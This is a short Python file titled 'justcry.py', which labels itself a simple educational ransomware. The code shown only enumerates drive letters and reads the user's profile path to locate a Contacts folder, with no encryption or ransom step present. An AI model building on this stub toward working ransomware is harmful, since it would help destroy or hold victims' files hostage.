'''
File: justcry.py
Author: Lil_Tim
Description: A simple ransomware, for educational purposes only
'''

import os
import subprocess

path = [i for i in range(65, 92) if os.path.exists(chr(i)+':')]

subprocess = subprocess.Popen("echo %userprofile%", shell=True, stdout=subprocess.PIPE)

user = str(subprocess.stdout.read())[2:-3]
print(user + '\\Contacts')
